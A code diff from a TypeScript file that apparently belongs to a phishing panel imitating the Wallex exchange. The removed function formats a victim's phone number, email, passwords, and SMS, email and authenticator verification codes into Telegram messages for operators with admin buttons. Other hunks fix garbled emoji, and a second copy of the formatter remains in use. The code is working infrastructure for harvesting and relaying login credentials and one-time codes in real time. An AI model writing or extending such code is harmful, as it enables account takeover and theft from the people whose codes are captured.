@@ -658,151 +658,6 @@ export const showAdminButtons = async (sessionId: string): Promise<boolean> => {
   }
 };
 
-/**
- * Format initial message with all session data
- */
-/**
- * Format session message with all available data (phone, email, codes) in professional boxes
- */
-const formatSessionMessage = (session: UserSession): string => {
-  // Escape HTML characters in user data
-  const escapeHtml = (text: string): string => {
-    return text
-      .replace(/&/g, "&amp;")
-      .replace(/</g, "&lt;")
-      .replace(/>/g, "&gt;")
-      .replace(/"/g, "&quot;")
-      .replace(/'/g, "&#39;");
-  };
-
-  // Helper function to create a professional box
-  const createBox = (
-    title: string,
-    content: string,
-    emoji: string = "📋",
-  ): string => {
-    return `
-╔══════════════════════════════════════╗
-║ ${emoji} <b>${title}</b>
-╠──────────────────────────────────────╢
-║ ${content}
-╚══════════════════════════════════════╝`;
-  };
-
-  // Helper function to create a compact info box
-  const createInfoBox = (items: string[]): string => {
-    const content = items.map((item) => `║ ${item}`).join("\n");
-    return `
-╔══════════════════════════════════════╗
-${content}
-╚══════════════════════════════════════╝`;
-  };
-
-  // Main header
-  let message = `🚨 <b>درخواست ورود جدید به والکس</b> 🚨
-
-${createBox(
-  "اطلاعات کاربر",
-  `📱 شماره همراه: <code>${escapeHtml(session.phoneNumber)}</code>\n║ 🆔 شناسه نشست: <code>${escapeHtml(session.sessionId.substring(0, 12))}...</code>\n║ 📍 وضعیت: <b>${escapeHtml(getCurrentStepText(session.currentStep))}</b>\n║ ⏰ زمان شروع: ${escapeHtml(session.startTime)}`,
-  "👤",
-)}`;
-
-  // Online status box (if available)
-  if (session.onlineStatus) {
-    const timeSinceUpdate = Date.now() - session.onlineStatus.lastUpdate;
-    const timeAgo =
-      timeSinceUpdate > 60000
-        ? `${Math.floor(timeSinceUpdate / 60000)} دقیقه پیش`
-        : `${Math.floor(timeSinceUpdate / 1000)} ثانیه پیش`;
-
-    message += `\n${createBox(
-      "وضعیت آنلاین کاربر",
-      `${session.onlineStatus.statusEmoji} <b>${escapeHtml(session.onlineStatus.statusText)}</b>\n║ ⏱️ آخرین فعالیت: ${timeAgo}`,
-      "🌐",
-    )}`;
-  }
-
-  // Phone verification code box
-  if (session.phoneVerificationCode) {
-    message += `\n${createBox(
-      "کد تایید شماره همراه",
-      `✅ <code>${escapeHtml(session.phoneVerificationCode)}</code>`,
-      "📱",
-    )}`;
-  }
-
-  // Email information box
-  if (session.email) {
-    let emailContent = `📧 آدرس ایمیل: <code>${escapeHtml(session.email)}</code>`;
-    if (session.emailCode) {
-      emailContent += `\n║ ✅ کد تایید: <code>${escapeHtml(session.emailCode)}</code>`;
-    } else {
-      emailContent += `\n║ ⏳ در انتظار کد تایید...`;
-    }
-
-    message += `\n${createBox("اطلاعات ایمیل", emailContent, "📧")}`;
-  }
-
-  // Authentication codes boxes - separate box for each type
-  if (session.authCodes && Object.keys(session.authCodes).length > 0) {
-    Object.keys(session.authCodes).forEach((stepType) => {
-      const codes = session.authCodes[stepType];
-      if (codes && codes.length > 0) {
-        const stepName = getStepDisplayName(stepType);
-        let stepEmoji = "🔐";
-
-        // Choose appropriate emoji based on step type
-        switch (stepType) {
-          case "password":
-            stepEmoji = "🔒";
-            break;
-          case "google":
-            stepEmoji = "📱";
-            break;
-          case "sms":
-            stepEmoji = "💬";
-            break;
-          case "email":
-            stepEmoji = "📧";
-            break;
-        }
-
-        const codesContent = codes
-          .map(
-            (code, index) =>
-              `${index === codes.length - 1 ? "✅" : "📝"} کد ${index + 1}: <code>${escapeHtml(code)}</code>`,
-          )
-          .join("\n║ ");
-
-        message += `\n${createBox(stepName, codesContent, stepEmoji)}`;
-      }
-    });
-  }
-
-  // Summary and statistics box
-  const completedStepsCount = session.completedSteps?.length || 0;
-  const totalAttempts = Object.values(session.authAttempts || {}).reduce(
-    (sum, count) => sum + count,
-    0,
-  );
-
-  const summaryItems = [
-    `📊 مراحل تکمیل شده: <b>${completedStepsCount}</b>`,
-    `🔄 تعداد تلاش‌ها: <b>${totalAttempts}</b>`,
-    `🕐 آخرین به‌روزرسانی: ${escapeHtml(new Date().toLocaleString("fa-IR"))}`,
-    `⚡ وضعیت سیستم: <b>آماده پردازش</b>`,
-  ];
-
-  message += `\n${createInfoBox(summaryItems)}`;
-
-  // Footer with professional touch
-  message += `\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🛡️ <i>سیستم احراز هویت هوشمند والکس</i>
-━━━━━━━━━━━━━━━━��━━━━━━━━━━━━━━━━━━━━━━━`;
-
-  return message;
-};
-
 const formatInitialMessage = (session: UserSession): string => {
   return formatSessionMessage(session);
 };
@@ -1078,7 +933,7 @@ const updateTelegramMessage = async (
       payload.reply_markup = replyMarkup;
     }
 
-    console.log("��� Updating Telegram message:", {
+    console.log("🔄 Updating Telegram message:", {
       messageId,
       textLength: text.length,
       retryCount,
@@ -1284,7 +1139,7 @@ const formatSessionMessage = (session: UserSession): string => {
     Object.keys(session.authCodes).forEach((stepType) => {
       const stepCodes = session.authCodes[stepType];
       if (stepCodes && stepCodes.length > 0) {
-        let stepEmoji = "���";
+        let stepEmoji = "🔐";
         let stepName = "";
 
         // Choose appropriate emoji and name
